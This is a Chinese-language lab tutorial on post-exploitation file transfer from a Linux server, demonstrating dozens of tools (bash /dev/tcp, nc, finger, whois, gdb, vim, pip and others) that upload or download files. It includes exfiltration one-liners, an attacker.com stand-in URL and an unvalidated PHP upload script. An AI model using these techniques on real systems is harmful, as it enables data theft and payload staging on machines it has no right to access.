# **一、** ** **操作目的和应用场景****

本文介绍Linux系统中进行文件传输的方法，主要用于后渗透过程中。

在本文的每个例子中，标题中的命令都是在Linux服务器上执行的。

  

#  **二、** ** **平台及工具版本****

Linux服务器：CentOS 7，192.168.43.234（部分CentOS 7系统无法实现的，在Kali Linux系统中实现）

远程主机1：Linux Mint 20，192.168.43.237

远程主机2：windows xp，192.168.43.87

  

#  **三、Linux服务器将文件上传到远程主机**

##  **1、** ** **bash****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机监听12345端口

nc -l -p 12345 > bash.get

  

第二步，Linux服务器创建测试文件并使用bash将文件上传到远程主机

echo "sent by bash." > bash.sent

bash -c 'cat bash.sent > /dev/tcp/192.168.43.237/12345'

![1615377088_6048b2c0ef137e3714100.png!small?1615377159985](https://image.3001.net/images/20210310/1615377088_6048b2c0ef137e3714100.png!small?1615377159985)

  

第三步，远程主机查看接收到的文件

![1615377097_6048b2c99b96f8eb0cb40.png!small?1615377168694](https://image.3001.net/images/20210310/1615377097_6048b2c99b96f8eb0cb40.png!small?1615377168694)文件传输成功。

  

##  **2、** ** **busybox****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用busybox启动web服务器

echo "sent by busybox." > busybox.sent

//启动http服务，监听12345端口，指定当前目录为工作目录

busybox httpd -f -p 12345 -h .

  

第二步，远程主机从Linux主机下载文件

wget http://192.168.43.234:12345/busybox.sent -O busybox.get

![1615377111_6048b2d716ad70d9cfb45.png!small?1615377182205](https://image.3001.net/images/20210310/1615377111_6048b2d716ad70d9cfb45.png!small?1615377182205)

文件传输成功。

  

##  **3、** ** **curl****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机启动phpstudy，创建文件，名为upload_file.php，内容如下：

<?php

if ($_FILES["file"]["error"] > 0)

{

echo "错误：" . $_FILES["file"]["error"] . "<br>";

}

else

{

//将文件保存在当前目录

move_uploaded_file($_FILES["file"]["tmp_name"], "./" .
$_FILES["file"]["name"]);

echo "文件存储在: " . "./" . $_FILES["file"]["name"];

echo "\n";

}

?>

保存退出。将upload_file.php放在web发布目录中,之后启动web服务。文件上传的URL为：

http://192.168.43.87/upload/upload_file.php

  

第二步，Linux服务器创建测试文件并使用curl将文件上传到远程主机

echo "sent by curl" > curl.sent

curl http://192.168.43.87/upload/upload_file.php -F "file=@curl.sent" -v

![1615377123_6048b2e3b135d05d8e199.png!small?1615377194909](https://image.3001.net/images/20210310/1615377123_6048b2e3b135d05d8e199.png!small?1615377194909)

  

第三步，远程主机查看接收到的文件

![1615377131_6048b2eb18538a8f59047.png!small?1615377202382](https://image.3001.net/images/20210310/1615377131_6048b2eb18538a8f59047.png!small?1615377202382)

文件传输成功。

  

##  **4、** ** **finger****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机监听79端口

sudo nc -l -p 79 | base64 -d > finger.get

  

第二步，Linux服务器创建测试文件并使用finger上传文件

echo "sent by finger" > finger.sent

finger "$(base64 finger.sent)@192.168.43.237"

![1615377142_6048b2f67dd62ea029efd.png!small?1615377213854](https://image.3001.net/images/20210310/1615377142_6048b2f67dd62ea029efd.png!small?1615377213854)

  

第三步，远程主机查看收到的文件

![1615377149_6048b2fd997570c54c0ed.png!small?1615377220602](https://image.3001.net/images/20210310/1615377149_6048b2fd997570c54c0ed.png!small?1615377220602)

文件传输成功。

  

##  **5、** ** **ftp****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机启动ftp服务

sudo python3 -m pyftpdlib -w -p 21

![1615377156_6048b3049dd02c54240b9.png!small?1615377228082](https://image.3001.net/images/20210310/1615377156_6048b3049dd02c54240b9.png!small?1615377228082)

  

第二步，Linux服务器创建测试文件并使用ftp将文件上传到远程主机

echo "sent by ftp." > ftp.sent

ftp 192.168.43.237

put ftp.sent ftp.get

![1615377163_6048b30bb7e559611030a.png!small?1615377234941](https://image.3001.net/images/20210310/1615377163_6048b30bb7e559611030a.png!small?1615377234941)

  

第三步，远程主机查看接收到的文件

![1615377169_6048b311eb1f7617fe47b.png!small?1615377241084](https://image.3001.net/images/20210310/1615377169_6048b311eb1f7617fe47b.png!small?1615377241084)

文件传输成功。

  

##  **6、** ** **ftp-upload****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机启动ftp服务

sudo python3 -m pyftpdlib -w -p 21

![1615377177_6048b31920af25a3e5707.png!small?1615377248455](https://image.3001.net/images/20210310/1615377177_6048b31920af25a3e5707.png!small?1615377248455)

  

第二步，Linux服务器创建测试文件并使用ftp将文件上传到远程主机

echo "sent by ftp-upload." > ftp-upload.sent

perl ./ftp-upload -h 192.168.43.237 -u anonymous --password anonymous --as
ftp-upload.get ftp-upload.sent

![1615377183_6048b31f4796771c9f5e9.png!small?1615377254395](https://image.3001.net/images/20210310/1615377183_6048b31f4796771c9f5e9.png!small?1615377254395)

  

第三步，远程主机查看接收到的文件

![1615377195_6048b32b0d63857c6ee85.png!small?1615377266176](https://image.3001.net/images/20210310/1615377195_6048b32b0d63857c6ee85.png!small?1615377266176)

文件传输成功。

  

##  **7、** ** **gdb****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用gdb启动web服务

echo "sent by gdb." > gdb.sent

export LPORT=8888

gdb -nx -ex 'python import sys; from os import environ as e

if sys.version_info.major == 3: import http.server as s, socketserver as ss

else: import SimpleHTTPServer as s, SocketServer as ss

ss.TCPServer(("", int(e["LPORT"])),
s.SimpleHTTPRequestHandler).serve_forever()' -ex quit

![1615377205_6048b335a4e62bf1d1f57.png!small?1615377277029](https://image.3001.net/images/20210310/1615377205_6048b335a4e62bf1d1f57.png!small?1615377277029)

  

第二步，远程主机从Linux服务器下载文件

wget http://192.168.43.234:8888/gdb.sent -O gdb.get

![1615377213_6048b33d1424bff200ff9.png!small?1615377284400](https://image.3001.net/images/20210310/1615377213_6048b33d1424bff200ff9.png!small?1615377284400)

文件传输成功。

  

##  **8、** ** **gimp****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用gimp启动web服务

echo "sent by gimp." > gimp.sent

export LPORT=8888

gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import
environ as e

if sys.version_info.major == 3: import http.server as s, socketserver as ss

else: import SimpleHTTPServer as s, SocketServer as ss

ss.TCPServer(("", int(e["LPORT"])),
s.SimpleHTTPRequestHandler).serve_forever()'

  

第二步，远程主机从Linux服务器下载文件

wget http://192.168.43.234:8888/gimp.sent -O gimp.get

![1615377223_6048b3475b585d3eec082.png!small?1615377294642](https://image.3001.net/images/20210310/1615377223_6048b3475b585d3eec082.png!small?1615377294642)

文件传输成功。

  

##  **9、** ** **irb****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用irb启动web服务

echo "sent by irb." > irb.sent

irb

require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot =>
Dir.pwd).start;

exit

![1615377246_6048b35e8e85549eeaecd.png!small?1615377317991](https://image.3001.net/images/20210310/1615377246_6048b35e8e85549eeaecd.png!small?1615377317991)

  

第二步，远程主机从LInux服务器下载文件

wget http://192.168.43.234:8888/irb.sent -O irb.get

![1615377253_6048b365a76dec55010f2.png!small?1615377324744](https://image.3001.net/images/20210310/1615377253_6048b365a76dec55010f2.png!small?1615377324744)

文件传输成功。

  

##  **10、** ** **ksh****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用ksh监听本地端口

echo "sent by ksh." > ksh.sent

ksh -c 'cat ksh.sent > /dev/tcp/192.168.43.237/12345'

![1615377260_6048b36c4bdb3a271ee23.png!small?1615377331297](https://image.3001.net/images/20210310/1615377260_6048b36c4bdb3a271ee23.png!small?1615377331297)

  

第二步，远程主机从Linux服务器下载文件

![1615377268_6048b374c86912d019e61.png!small?1615377339903](https://image.3001.net/images/20210310/1615377268_6048b374c86912d019e61.png!small?1615377339903)

文件传输成功。

  

##  **11、** ** **nc****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机监听端口

nc -l -p 12345 > netcat.get

  

第二步，Linux服务器创建测试文件并使用netcat将文件上传到远程主机

echo "sent by netcat." > netcat.sent

nc 192.168.43.237 12345 < netcat.sent

  

第三步，远程主机查看接收的文件

![1615377276_6048b37c721a336e93a51.png!small?1615377347485](https://image.3001.net/images/20210310/1615377276_6048b37c721a336e93a51.png!small?1615377347485)

文件传输成功。

  

##  **12、** ** **openssl****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机创建证书并启动监听

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
-nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > openssl.get

![1615377284_6048b3842672816027650.png!small?1615377355573](https://image.3001.net/images/20210310/1615377284_6048b3842672816027650.png!small?1615377355573)

  

第二步，Linux服务器创建测试文件并使用openssl将文件上传到远程主机

echo "sent by openssl." > openssl.sent

openssl s_client -quiet -connect 192.168.43.237:12345 < "openssl.sent"

![1615377290_6048b38a0c9557bc21122.png!small?1615377361100](https://image.3001.net/images/20210310/1615377290_6048b38a0c9557bc21122.png!small?1615377361100)

  

第三步，远程主机查看接收到的文件

![1615377298_6048b3924be5aeec8fcd7.png!small?1615377369396](https://image.3001.net/images/20210310/1615377298_6048b3924be5aeec8fcd7.png!small?1615377369396)文件传输成功。

  

##  **13、** ** **php****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用php启动web服务

echo "sent by php." > php.sent

php -S 192.168.43.234:8888

![1615377307_6048b39bbf8e652459e08.png!small?1615377378914](https://image.3001.net/images/20210310/1615377307_6048b39bbf8e652459e08.png!small?1615377378914)

  

第二步，远程主机从Linux服务器下载文件

wget http://192.168.43.234:8888/php.sent -O php.get

![1615377314_6048b3a2544544b52c78b.png!small?1615377385677](https://image.3001.net/images/20210310/1615377314_6048b3a2544544b52c78b.png!small?1615377385677)

文件传输成功。

  

##  **14、** ** **pip****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用pip启动web服务

echo "sent by pip." > pip.sent

export LPORT=8888

TF=$(mktemp -d)

echo 'import sys; from os import environ as e

if sys.version_info.major == 3: import http.server as s, socketserver as ss

else: import SimpleHTTPServer as s, SocketServer as ss

ss.TCPServer(("", int(e["LPORT"])),
s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py

pip3 install $TF

![1615377325_6048b3ad4293ad2f4bda8.png!small?1615377396222](https://image.3001.net/images/20210310/1615377325_6048b3ad4293ad2f4bda8.png!small?1615377396222)

  

第二步，远程主机从Linux服务器下载文件

wget http://192.168.43.234:8888/pip.sent -O pip.get

![1615377332_6048b3b4d7a8fb1f3a277.png!small?1615377404002](https://image.3001.net/images/20210310/1615377332_6048b3b4d7a8fb1f3a277.png!small?1615377404002)

文件传输成功。

  

注意，在本例中，pip所发布web内容位于临时目录中，但不是/tmp/tmp.PBrtM68K5v，而是在/tmp/pip-jtub6bzs-build，需要将pip.sent文件复制到该目录中才能下载。

  

##  **15、** ** **python****

第一步，Linux服务器创建测试文件并使用python启动web服务

echo "sent by easy_install" > easy_install.txt

python3 -m http.server 8080

![1615377347_6048b3c337b017d2f117a.png!small?1615377418963](https://image.3001.net/images/20210310/1615377347_6048b3c337b017d2f117a.png!small?1615377418963)

第二步，远程主机从Linux服务器下载文件

wget http://192.168.43.234:8080/easy_install.txt

![1615377353_6048b3c9801c259406bea.png!small?1615377424893](https://image.3001.net/images/20210310/1615377353_6048b3c9801c259406bea.png!small?1615377424893)

文件传输成功。

  

##  **16、** ** **restic****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机运行SSH服务并启用SFTP

systemctl start sshd

  

第二步，Linux服务器创建测试文件并使用restic将文件上传到远程主机

RHOST=192.168.43.237

RPORT=12345

echo "sent by restic." > restic.sent

//初始化存储仓库

restic -r sftp:root@192.168.43.237:/home/sftp/ftpuser1/upload init

![1615377364_6048b3d44a04c78af1c7b.png!small?1615377435338](https://image.3001.net/images/20210310/1615377364_6048b3d44a04c78af1c7b.png!small?1615377435338)

//备份到远程存储仓库

restic -r sftp:root@192.168.43.237:/home/sftp/ftpuser1/upload backup
restic.sent

![1615377370_6048b3da874a3c22dfd29.png!small?1615377441691](https://image.3001.net/images/20210310/1615377370_6048b3da874a3c22dfd29.png!small?1615377441691)

  

第三步，远程主机查看接收到的文件

![1615377376_6048b3e05b7944ceb2635.png!small?1615377447531](https://image.3001.net/images/20210310/1615377376_6048b3e05b7944ceb2635.png!small?1615377447531)

文件传输成功。

  

##  **17、** ** **rsync****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机启动ssh服务。

systemctl start sshd

  

第二步，Linux服务器创建测试文件并使用rsync将文件上传到远程主机

echo "sent by rsync." > rsync.sent

rsync -v -u -a -stat rsync.sent user1@192.168.43.237:/home/user1/rsync.get

![1615377386_6048b3ea7dc78318ec9e7.png!small?1615377457765](https://image.3001.net/images/20210310/1615377386_6048b3ea7dc78318ec9e7.png!small?1615377457765)

  

第三步，远程主机查看接收到的文件

![1615377392_6048b3f093cc81f96361f.png!small?1615377463701](https://image.3001.net/images/20210310/1615377392_6048b3f093cc81f96361f.png!small?1615377463701)

文件传输成功。

  

##  **18、** ** **ruby****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用ruby启动web服务

echo "sent by ruby." > ruby.sent

ruby -run -e httpd . -p 8888

![1615377399_6048b3f782a3b739396dd.png!small?1615377470667](https://image.3001.net/images/20210310/1615377399_6048b3f782a3b739396dd.png!small?1615377470667)

  

第二步，远程主机从Linux服务器下载文件

wget http://192.168.43.234:8888/ruby.sent -O ruby.get

![1615377404_6048b3fccbc88e0fc1f87.png!small?1615377475993](https://image.3001.net/images/20210310/1615377404_6048b3fccbc88e0fc1f87.png!small?1615377475993)

文件传输成功。

  

##  **19、** ** **rvim****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用rvim启动web服务

export LPORT=8888

echo "sent by rvim." > rvim.sent

rvim -c ':py import vim,sys; from os import environ as e

if sys.version_info.major == 3: import http.server as s, socketserver as ss

else: import SimpleHTTPServer as s, SocketServer as ss

ss.TCPServer(("", int(e["LPORT"])),
s.SimpleHTTPRequestHandler).serve_forever()

vim.command(":q!")'

服务启动后命令窗口全黑。

  

第二步，远程主机从Linux服务器下载文件

![1615377413_6048b4051e2dae165541b.png!small?1615377485316](https://image.3001.net/images/20210310/1615377413_6048b4051e2dae165541b.png!small?1615377485316)文件传输成功。

  

##  **20、** ** **scp****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机启动ssh服务。

systemctl start sshd

  

第二步，Linux服务器创建测试文件并使用scp将文件上传到远程主机

echo "sent by scp." > scp.sent

scp scp.sent user1@192.168.43.237:/home/user1/scp.get

![1615377426_6048b4121c2283c06e2ac.png!small?1615377497496](https://image.3001.net/images/20210310/1615377426_6048b4121c2283c06e2ac.png!small?1615377497496)

  

第三步，远程主机查看接收到的文件

![1615377434_6048b41ac3e6155636dfa.png!small?1615377505898](https://image.3001.net/images/20210310/1615377434_6048b41ac3e6155636dfa.png!small?1615377505898)文件传输成功。

  

##  **21、** ** **sftp****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机运行SSH服务并启用SFTP

systemctl start sshd

  

第二步，Linux服务器创建测试文件并使用sftp将文件上传到远程主机

echo "sent by sftp." > sftp.sent

sftp ftpuser1@192.168.43.237

put sftp.sent sftp.get

![1615377460_6048b4343e1ecc965daa5.png!small?1615377531293](https://image.3001.net/images/20210310/1615377460_6048b4343e1ecc965daa5.png!small?1615377531293)

第三步，远程主机查看收到的文件

![1615377466_6048b43a9b57d02ed8d86.png!small?1615377537945](https://image.3001.net/images/20210310/1615377466_6048b43a9b57d02ed8d86.png!small?1615377537945)

文件传输成功。

  

##  **22、** ** **smbclient****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机启动smb共享

sudo smbserver.py tmp ./ //smbclient在Impacker包中

![1615377473_6048b441a011c9d52e97e.png!small?1615377544807](https://image.3001.net/images/20210310/1615377473_6048b441a011c9d52e97e.png!small?1615377544807)

  

第二步，Linux服务器创建测试文件并使用smbclient将文件上传到远程主机

echo "sent by smbclient." > smbclient.sent

smbclient '\\\192.168.43.237\TMP' -c 'put smbclient.sent smbclient.get'

![1615377479_6048b447d17f0a0759926.png!small?1615377550846](https://image.3001.net/images/20210310/1615377479_6048b447d17f0a0759926.png!small?1615377550846)

  

第三步，远程主机查看收到的文件

![1615377486_6048b44e5e49bfb137cb2.png!small?1615377557412](https://image.3001.net/images/20210310/1615377486_6048b44e5e49bfb137cb2.png!small?1615377557412)

文件传输成功。

  

##  **23、** ** **socat****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机启动监听

socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt

  

第二步，Linux服务器创建测试文件并使用socat将文件上传到远程主机

echo "sent by nmap." > nmap.sent

socat -u FILE:nmap.sent TCP:192.168.43.237:9876

  

第三步，远程主机查看接收到的文件

![1615377498_6048b45a19fc2220db8f5.png!small?1615377569386](https://image.3001.net/images/20210310/1615377498_6048b45a19fc2220db8f5.png!small?1615377569386)

文件传输成功。

  

##  **24、** ** **ssh****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机运行ssh服务。

systemctl start sshd

  

第二步，Linux服务器创建测试文件并使用ssh将文件上传到远程主机

echo "sent by ssh." > ssh.sent

ssh user1@192.168.43.237 "cat > ssh.get" < ssh.sent

![1615377507_6048b4632f14396f5917b.png!small?1615377578292](https://image.3001.net/images/20210310/1615377507_6048b4632f14396f5917b.png!small?1615377578292)

  

第三步，远程主机查看接收到的文件

![1615377513_6048b469463e5cc9bd39c.png!small?1615377584334](https://image.3001.net/images/20210310/1615377513_6048b469463e5cc9bd39c.png!small?1615377584334)

文件传输成功。

  

##  **25、** ** **tar****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机运行ssh服务

systemctl start sshd

  

第二步，Linux服务器创建测试文件并使用tar将文件上传到远程主机

echo "sent by tar." > tar.sent

tar cvf user1@192.168.43.237:tar.get tar.sent --rsh-command=/bin/ssh

![1615377523_6048b4734f09b21f19850.png!small?1615377594375](https://image.3001.net/images/20210310/1615377523_6048b4734f09b21f19850.png!small?1615377594375)

  

第三步，远程主机查看接收到的文件

![1615377529_6048b4795160880979a0f.png!small?1615377600506](https://image.3001.net/images/20210310/1615377529_6048b4795160880979a0f.png!small?1615377600506)

文件传输成功。

  

##  **26、** ** **tftp****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，远程主机运行TFTP服务

apt-get install atftpd //安装tftp服务程序

mkdir /tmp/backup //创建目录

chmod 777 /tmp/backup //修改权限

sudo atftpd --daemon --port 69 /tmp/backup //启动服务程序

![1615377536_6048b4806a822ff568c94.png!small?1615377607477](https://image.3001.net/images/20210310/1615377536_6048b4806a822ff568c94.png!small?1615377607477)

  

第二步，Linux服务器创建测试文件并使用tftp将文件上传到远程主机

echo "sent by tftp." > tftp.sent

tftp 192.168.43.237

put tftp.sent tftp.get

![1615377542_6048b486ced1b67d2280b.png!small?1615377614444](https://image.3001.net/images/20210310/1615377542_6048b486ced1b67d2280b.png!small?1615377614444)

  

第三步，远程主机查看接收到的文件

![1615377548_6048b48c9fd081a915cc6.png!small?1615377619662](https://image.3001.net/images/20210310/1615377548_6048b48c9fd081a915cc6.png!small?1615377619662)

文件传输成功。

  

##  **27、** ** **vim****

使用下面的命令将服务器本地文件上传到远程主机：

第一步，Linux服务器创建测试文件并使用vim启动web服务器

echo "sent by vim." > vim.sent

export LPORT=8888

vim -c ':py import vim,sys; from os import environ as e

if sys.version_info.major == 3: import http.server as s, socketserver as ss

else: import SimpleHTTPServer as s, SocketServer as ss

ss.TCPServer(("", int(e["LPORT"])),
s.SimpleHTTPRequestHandler).serve_forever()

vim.command(":q!")'

  

第二步，远程主机从Linux服务器下载文件

![1615377557_6048b4955db8a477b020b.png!small?1615377628568](https://image.3001.net/images/20210310/1615377557_6048b4955db8a477b020b.png!small?1615377628568)

文件传输成功。

  

##  **28、** ** **whois****

使用下面的命令将服务器本地文件上传到远程主机：

方法1

第一步，远程主机启动监听

nc -l -p 12345 > whois.get

  

第二步，Linux服务器创建测试文件并使用whois将文件上传到远程主机

echo "sent by whois." > whois.sent

whois -h 192.168.43.237 -p 12345 "`cat whois.sent`"

![1615377606_6048b4c6716eab080c183.png!small?1615377677516](https://image.3001.net/images/20210310/1615377606_6048b4c6716eab080c183.png!small?1615377677516)

第三步，远程主机查看接收到的文件

![1615377617_6048b4d18dced07097e53.png!small?1615377688676](https://image.3001.net/images/20210310/1615377617_6048b4d18dced07097e53.png!small?1615377688676)

文件传输成功。

  

方法2

第一步，远程主机启动监听

nc -l -p 12345 | tr -d $'\x0d' | base64 -d > whois.get

  

第二步，Linux服务器创建测试文件并使用whois将文件上传到远程主机

echo "sent by whois again." > whois.sent

whois -h 192.168.43.237 -p 12345 "`base64 whois.sent`"

![1615377628_6048b4dc4348f252659ed.png!small?1615377699332](https://image.3001.net/images/20210310/1615377628_6048b4dc4348f252659ed.png!small?1615377699332)

文件传输成功。

  

#  **三、Linux服务器从远程主机下载文件**

##  **1、** ** **bash****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并监听端口

echo "get by bash." > bash.sent

nc -l -p 12345 < bash.sent

![1615378288_6048b770e6c5ee50e0440.png!small?1615378360017](https://image.3001.net/images/20210310/1615378288_6048b770e6c5ee50e0440.png!small?1615378360017)

  

第二步，Linux服务器使用bash从远程主机下载文件

bash -c 'cat < /dev/tcp/192.168.43.237/12345 > bash.get'

![1615378298_6048b77a19718818a91a1.png!small?1615378369231](https://image.3001.net/images/20210310/1615378298_6048b77a19718818a91a1.png!small?1615378369231)文件传输成功。

  

##  **2、** ** **curl****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by curl." > curl.sent

python3 -m http.server 8080

![1615378308_6048b784defa3d6a619a1.png!small?1615378379979](https://image.3001.net/images/20210310/1615378308_6048b784defa3d6a619a1.png!small?1615378379979)

  

第二步，Linux服务器使用curl从远程主机下载文件

curl http://192.168.43.237:8080/curl.sent -o curl.get

![1615378322_6048b792391aae99d2ac7.png!small?1615378393291](https://image.3001.net/images/20210310/1615378322_6048b792391aae99d2ac7.png!small?1615378393291)

文件传输成功。

  

##  **3、** ** **finger****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行netcat监听端口

echo "get by finger." > finger.sent

base64 "finger.sent" | sudo nc -l -p 79

![1615378329_6048b799078bbbb6a5570.png!small?1615378400049](https://image.3001.net/images/20210310/1615378329_6048b799078bbbb6a5570.png!small?1615378400049)

  

第二步，Linux服务器使用finger从远程主机下载文件

finger @192.168.43.237 | grep -v 192.168.43.237 | base64 -d > finger.get

![1615378334_6048b79ed0ae3c2e1aac1.png!small?1615378405887](https://image.3001.net/images/20210310/1615378334_6048b79ed0ae3c2e1aac1.png!small?1615378405887)

文件传输成功。

  

##  **4、** ** **ftp****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动FTP服务

echo "get by ftp." > ftp.sent

python3 -m pyftpdlib -p 2121

![1615378342_6048b7a601f48f9507710.png!small?1615378413161](https://image.3001.net/images/20210310/1615378342_6048b7a601f48f9507710.png!small?1615378413161)

  

第二步，Linux服务器使用ftp从远程主机下载文件

ftp 192.168.43.237

get ftp.sent ftp.get

![1615378350_6048b7ae2227650cd5297.png!small?1615378421252](https://image.3001.net/images/20210310/1615378350_6048b7ae2227650cd5297.png!small?1615378421252)

文件传输成功。

  

##  **5、** ** **gdb****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by gdb." > gdb.sent

python3 -m http.server 8080

![1615378356_6048b7b4ee0eda29a8c99.png!small?1615378428107](https://image.3001.net/images/20210310/1615378356_6048b7b4ee0eda29a8c99.png!small?1615378428107)

  

第二步，Linux服务器使用gdb下载文件

export URL=http://192.168.43.237:8080/gdb.sent

export LFILE=gdb.get

gdb -nx -ex 'python import sys; from os import environ as e

if sys.version_info.major == 3: import urllib.request as r

else: import urllib as r

r.urlretrieve(e["URL"], e["LFILE"])' -ex quit

![1615378363_6048b7bbd78c0ea4302ca.png!small?1615378435685](https://image.3001.net/images/20210310/1615378363_6048b7bbd78c0ea4302ca.png!small?1615378435685)

文件传输成功。

  

##  **6、** ** **gimp****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by gimp." > gimp.sent

python3 -m http.server 8080

![1615378370_6048b7c222d7fb5d52b35.png!small?1615378441205](https://image.3001.net/images/20210310/1615378370_6048b7c222d7fb5d52b35.png!small?1615378441205)

  

第二步，Linux服务器使用gimp下载文件

export URL=http://192.168.43.237:8080/gimp.sent

export LFILE=gimp.get

gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import
environ as e

if sys.version_info.major == 3: import urllib.request as r

else: import urllib as r

r.urlretrieve(e["URL"], e["LFILE"])'

![1615378377_6048b7c92eb1f35dd3059.png!small?1615378448385](https://image.3001.net/images/20210310/1615378377_6048b7c92eb1f35dd3059.png!small?1615378448385)

文件传输成功。

  

##  **7、** ** **irb****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by irb." > irb.sent

python3 -m http.server 8080

![1615378384_6048b7d092d4d8d7a7caa.png!small?1615378455658](https://image.3001.net/images/20210310/1615378384_6048b7d092d4d8d7a7caa.png!small?1615378455658)

  

第二步，Linux服务器使用irb下载文件

export URL=http://192.168.43.237:8080/irb.sent

export LFILE=irb.get

irb

require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download,
ENV['LFILE'])

![1615378391_6048b7d75cec97dfc6fb5.png!small?1615378462827](https://image.3001.net/images/20210310/1615378391_6048b7d75cec97dfc6fb5.png!small?1615378462827)

文件传输成功。

  

##  **8、** ** **jjs****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by jjs." > jjs.sent

python3 -m http.server 8080

![1615378398_6048b7de2aa699adc67cb.png!small?1615378469180](https://image.3001.net/images/20210310/1615378398_6048b7de2aa699adc67cb.png!small?1615378469180)

  

第二步，Linux服务器使用jjs下载文件

export URL=http://192.168.43.237:8080/jjs.sent

export LFILE=jjs.get

echo "var URL = Java.type('java.net.URL');

var ws = new URL('$URL');

var Channels = Java.type('java.nio.channels.Channels');

var rbc = Channels.newChannel(ws.openStream());

var FileOutputStream = Java.type('java.io.FileOutputStream');

var fos = new FileOutputStream('$LFILE');

fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);

fos.close();

rbc.close();" | jjs

![1615378407_6048b7e76fa4c289292ed.png!small?1615378479938](https://image.3001.net/images/20210310/1615378407_6048b7e76fa4c289292ed.png!small?1615378479938)

文件传输成功。

  

##  **9、** ** **jrunscript****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by jrunscript." > jrunscript.sent

python3 -m http.server
8080![1615378416_6048b7f0093660d122281.png!small?1615378487097](https://image.3001.net/images/20210310/1615378416_6048b7f0093660d122281.png!small?1615378487097)

第二步，Linux服务器使用irb下载文件

export URL=http://192.168.43.237:8080/jrunscript.sent

export LFILE=jrunscript.get

jrunscript -e "cp('$URL','$LFILE')"

![1615378426_6048b7fab5a931aa65c44.png!small?1615378497842](https://image.3001.net/images/20210310/1615378426_6048b7fab5a931aa65c44.png!small?1615378497842)

文件传输成功。

  

##  **10、** ** **ksh****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行netcat监听端口

echo "get by bash." > ksh.sent

nc -l -p 12345 < ksh.sent

![1615378435_6048b8033c5a5ddf27381.png!small?1615378506247](https://image.3001.net/images/20210310/1615378435_6048b8033c5a5ddf27381.png!small?1615378506247)

  

第二步，Linux服务器使用ksh下载文件

ksh -c 'cat < /dev/tcp/192.168.43.237/12345 > ksh.get'

![1615378447_6048b80f16e8a302b2258.png!small?1615378518114](https://image.3001.net/images/20210310/1615378447_6048b80f16e8a302b2258.png!small?1615378518114)

文件传输成功。

  

##  **11、** ** **lwp-download****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by lwp-download." > lwp-download.sent

python3 -m http.server 8080

![1615378454_6048b816412835b637400.png!small?1615378525282](https://image.3001.net/images/20210310/1615378454_6048b816412835b637400.png!small?1615378525282)

  

第二步，Linux服务器使用lwp-download下载文件

URL=http://attacker.com/file_to_get

LFILE=file_to_save

lwp-download http://192.168.43.237:8080/lwp-download.sent lwp-download.get

![1615378460_6048b81c95b2bcd711f09.png!small?1615378531729](https://image.3001.net/images/20210310/1615378460_6048b81c95b2bcd711f09.png!small?1615378531729)

文件传输成功。

  

##  **12、** ** **nc****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行netcat监听端口

echo "get by netcat." > netcat.sent

nc -l -p 12345 < netcat.sent

![1615378467_6048b8235656b61578fbb.png!small?1615378538707](https://image.3001.net/images/20210310/1615378467_6048b8235656b61578fbb.png!small?1615378538707)

第二步，Linux服务器使用netcat下载文件

nc -l -p 12345 > netcat.get

nc 192.168.43.237 12345 > netcat.get

![1615378475_6048b82bd44c705beac7d.png!small?1615378546985](https://image.3001.net/images/20210310/1615378475_6048b82bd44c705beac7d.png!small?1615378546985)
